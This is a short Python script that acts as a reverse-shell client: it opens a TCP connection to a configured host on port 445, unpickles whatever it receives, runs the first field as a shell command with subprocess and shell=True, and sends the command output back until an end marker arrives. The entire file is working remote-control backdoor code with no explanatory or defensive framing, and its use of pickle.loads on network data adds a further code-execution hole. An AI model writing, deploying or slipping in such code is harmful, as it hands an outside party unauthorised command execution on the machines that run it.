import subprocess, socket, pickle

HOST = "0.0.0.0"
PORT = 445

doibreak = False

def yessir(idk):
    global doibreak
    #print(idk)
    r = subprocess.run(idk[0], text=True, capture_output=True, shell=True)
    out = r.stdout + r.stderr
    if idk[1] == "__eoc__":
        doibreak = True
    return out






with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST,PORT))
    while True:
        data = sock.recv(1024)
        if not data:
            break
        thing = pickle.loads(data)
        
        output = yessir(thing)
        
        sock.sendall(output.encode())
        if doibreak == True:
            break
